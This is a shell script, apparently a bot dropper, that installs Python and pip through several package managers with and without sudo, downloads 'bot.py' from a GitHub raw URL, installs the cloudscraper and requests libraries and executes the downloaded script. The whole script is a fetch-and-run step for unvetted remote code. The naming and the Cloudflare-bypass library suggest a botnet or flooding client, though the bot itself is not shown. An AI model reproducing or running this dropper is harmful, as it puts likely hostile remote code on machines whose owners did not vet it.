#!/bin/sh

# --- Python/Pip Installation (ohne und mit sudo) ---
apt update
apt install -y python3 python-pip3
apt install -y python python-pip
yum install -y python3 python-pip3
yum install -y python python-pip
pkg install -y python3 python-pip3
pkg install -y python python-pip

sudo apt update
sudo apt install -y python3 python-pip3
sudo apt install -y python python-pip
sudo yum install -y python3 python-pip3
sudo yum install -y python python-pip
sudo pkg install -y python3 python-pip3
sudo pkg install -y python python-pip

# --- Python-Skript herunterladen ---
wget -O bot.py https://raw.githubusercontent.com/M220506/net/refs/heads/main/bot.py
curl -o bot.py https://raw.githubusercontent.com/M220506/net/refs/heads/main/bot.py

# --- Python-Pakete installieren ---
pip3 install cloudscraper requests
pip install cloudscraper requests

sudo pip3 install cloudscraper requests
sudo pip install cloudscraper requests

python3 bot.py
python bot.py
